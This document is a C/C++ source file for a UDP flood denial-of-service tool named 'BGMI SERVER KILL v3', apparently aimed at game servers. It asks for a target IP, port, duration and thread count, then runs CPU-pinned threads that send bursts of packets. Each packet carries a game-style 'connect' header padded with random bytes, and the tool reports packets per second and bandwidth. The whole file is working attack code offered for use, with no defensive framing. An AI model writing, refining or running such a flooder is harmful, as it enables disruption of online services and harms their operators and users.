#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <iostream>
#include <string>
#include <vector>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>

#define PAYLOAD_SIZE 256
#define BURST 32

static std::string target_ip;
static int target_port;
static volatile unsigned long long g_pps;
static volatile unsigned long long g_bytes;

static unsigned char BGMI_MAGIC[24] = {
    0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static void *flood(void *arg) {
    long tid = (long)arg;

    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu > 0) {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(tid % ncpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
    }

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { perror("socket"); pthread_exit(NULL); }

    int sndbuf = 1 << 22;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip.c_str());

    struct mmsghdr msgs[BURST];
    struct iovec iov[BURST];
    unsigned char payloads[BURST][PAYLOAD_SIZE];
    unsigned int seed = (unsigned int)(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());

    for (int i = 0; i < BURST; i++) {
        memcpy(payloads[i], BGMI_MAGIC, sizeof(BGMI_MAGIC));
        memset(&msgs[i], 0, sizeof(msgs[i]));
        iov[i].iov_base = payloads[i];
        iov[i].iov_len = PAYLOAD_SIZE;
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
    }

    while (true) {
        for (int i = 0; i < BURST; i++)
            for (int j = sizeof(BGMI_MAGIC); j < PAYLOAD_SIZE; j++)
                payloads[i][j] = (unsigned char)(rand_r(&seed) & 0xFF);

        int sent = sendmmsg(sock, msgs, BURST, 0);
        if (sent < 0) {
            if (sendto(sock, payloads[0], PAYLOAD_SIZE, 0,
                       (struct sockaddr *)&addr, sizeof(addr)) < 0)
                usleep(1000);
            else { g_pps++; g_bytes += PAYLOAD_SIZE; }
        } else {
            g_pps += (unsigned long long)sent;
            g_bytes += (unsigned long long)sent * PAYLOAD_SIZE;
        }
    }
    return NULL;
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("====================================\n");
    printf("      BGMI SERVER KILL v3\n");
    printf("====================================\n");
    printf("IP: ");
    std::cin >> target_ip;
    printf("Port: ");
    std::cin >> target_port;
    printf("Time (seconds): ");
    int duration;
    std::cin >> duration;
    printf("Threads: ");
    int threads;
    std::cin >> threads;

    if (target_ip.empty() || target_port <= 0 || duration <= 0 || threads <= 0) {
        printf("bad parameters\n");
        return 1;
    }

    g_pps = 0;
    g_bytes = 0;

    std::vector<pthread_t> tids(threads);
    for (int i = 0; i < threads; i++)
        pthread_create(&tids[i], NULL, flood, (void *)(long)i);

    printf("Flooding %s:%d threads=%d for %ds\n",
           target_ip.c_str(), target_port, threads, duration);

    time_t end = time(NULL) + duration;
    while (time(NULL) < end) {
        sleep(1);
        double mbps = (double)g_bytes * 8.0 / 1e6;
        printf("pps=%llu  %.2f Mbps\n", g_pps, mbps);
        g_pps = 0;
        g_bytes = 0;
    }

    printf("Done.\n");
    return 0;
}
